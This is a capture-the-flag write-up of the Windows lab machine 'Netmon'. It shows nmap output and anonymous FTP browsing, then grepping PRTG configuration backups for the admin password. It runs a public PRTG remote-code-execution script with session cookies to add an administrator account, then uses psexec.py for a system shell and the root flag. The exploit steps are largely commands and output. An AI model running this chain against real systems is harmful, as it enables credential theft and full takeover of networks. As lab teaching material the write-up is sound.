# Netmon

Netmon was an easy windows machine that required access to ftp for the user flag making user super easy, root required a bit of enumeration of files on the system to find credentials for the http service and then exploiting that to get the root flag.
>Skills involved in this box:
- enumeration 
- exploit searching and exploitation

# USER

>Nmap

```bash
Host is up (0.016s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```
Nmap reveals that there is a service on port 80 and ftp is running, we go to check out the ftp first.

```bash
kali@kali:~/boxes/netmon$ ftp netmon.htb
Connected to netmon.htb.
220 Microsoft FTP Service
Name (netmon.htb:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd users
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       <DIR>          Administrator
02-03-19  12:35AM       <DIR>          Public
226 Transfer complete.
ftp> cd Public
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
02-03-19  12:35AM                   33 user.txt
07-16-16  09:18AM       <DIR>          Videos
226 Transfer complete.
ftp> type user.txt
user.txt: unknown mode
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
33 bytes received in 0.02 secs (1.9489 kB/s)
ftp> 
```
On our box we read the user flag after we transfer it to our machine with `get`.

Next we will go to the http service to check out what is running there.

There is a web page with a login page, so we will need to get credentials in order to access it.

```bash
ftp> cd Users
250 CWD command successful.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       <DIR>          Administrator
07-16-16  09:28AM       <DIR>          All Users
02-03-19  08:05AM       <DIR>          Default
07-16-16  09:28AM       <DIR>          Default User
07-16-16  09:16AM                  174 desktop.ini
02-03-19  12:35AM       <DIR>          Public
226 Transfer complete.
ftp> cd "All Users"
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:15AM       <DIR>          Licenses
11-20-16  10:36PM       <DIR>          Microsoft
02-03-19  12:18AM       <DIR>          Paessler
02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  09:18AM       <DIR>          SoftwareDistribution
02-03-19  12:15AM       <DIR>          TEMP
11-20-16  10:19PM       <DIR>          USOPrivate
11-20-16  10:19PM       <DIR>          USOShared
02-25-19  10:56PM       <DIR>          VMware
226 Transfer complete.
ftp> ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       <DIR>          Application Data
02-03-19  08:05AM       <DIR>          Desktop
02-03-19  08:05AM       <DIR>          Documents
02-03-19  12:15AM       <DIR>          Licenses
11-20-16  10:36PM       <DIR>          Microsoft
02-03-19  12:18AM       <DIR>          Paessler
02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  09:18AM       <DIR>          SoftwareDistribution
02-03-19  08:05AM       <DIR>          Start Menu
02-03-19  12:15AM       <DIR>          TEMP
02-03-19  08:05AM       <DIR>          Templates
11-20-16  10:19PM       <DIR>          USOPrivate
11-20-16  10:19PM       <DIR>          USOShared
02-25-19  10:56PM       <DIR>          VMware
226 Transfer complete.
ftp> cd "Application Data"
550 Access is denied. 
ftp> cd "Application Data/Passler"
550 The system cannot find the file specified. 
ftp> cd "Application Data/Paessler/PRTG Network Monitor"
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
06-13-20  10:10AM       <DIR>          Configuration Auto-Backups
06-13-20  10:10AM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
06-13-20  10:10AM       <DIR>          Logs (Web Server)
06-13-20  10:10AM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
06-13-20  10:11AM              1637504 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.
ftp> get "PRTG Configuration.dat"
local: PRTG Configuration.dat remote: PRTG Configuration.dat
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1189697 bytes received in 0.30 secs (3.8387 MB/s)
ftp> get "PRTG Configuration.old"
local: PRTG Configuration.old remote: PRTG Configuration.old
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1189697 bytes received in 0.30 secs (3.8198 MB/s)
ftp> get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1153755 bytes received in 0.28 secs (3.9093 MB/s)
```
We know have the 3 backup files on our box, we read all of them at once and grep for the keyword `prtgadmin` as that is the user we need to login to the website. The site is running `PRTG Netowrk Monitor` This helped us find the files that where in the ftp.

```bash
cat * | grep -A 20 -B 20 "prtgadmin"
```

This brings back a long list of results, we filter through them and find the credentials:
```php
<dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
            </dbpassword>
```
We then login to the site with theese creds but however it doesnt work, we tinker with the password and change it to `PrTg@dmin2019`
and it logs us in!

We now have access to another page which is running `PRTG Network Monitor`  like the last page.

We search for exploits and after a bit of googling we find an exploit here --> https://github.com/M4LV0/PRTG-Network-Monitor-RCE

We then use the exploit like so:
```bash
./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1"
```
We replace all the values with our cookies from inspect element/network/cookies and we run the exploit.

It creates a new user called `pentest` with the password `P3nT3st!` as administrator for the box.

After we run the exploit we can simply login with psexec.py 
```bash
kali@kali:~/boxes/netmon$ python3 /home/kali/impacket/examples/psexec.py pentest:'P3nT3st!'@netmon.htb
Impacket v0.9.22- Copyright 2020 SecureAuth Corporation

[*] Requesting shares on netmon.htb.....
[*] Found writable share ADMIN$
[*] Uploading file CxDBMiNZ.exe
[*] Opening SVCManager on netmon.htb.....
[*] Creating service NKCT on netmon.htb.....
[*] Starting service NKCT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd ../..
 
C:\>cd Users
cd
C:\Users> Administrator
 
C:\Users\Administrator>cd Desktop
 
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 684B-9CE8

 Directory of C:\Users\Administrator\Desktop

02/03/2019  12:35 AM    <DIR>          .
02/03/2019  12:35 AM    <DIR>          ..
02/03/2019  12:35 AM                33 root.txt
               1 File(s)             33 bytes
               2 Dir(s)  12,061,655,040 bytes free

C:\Users\Administrator\Desktop>type root.txt
3018977fb944bf1878f75b879fba67cc
```
Thanks for reading hope you enjoyed.
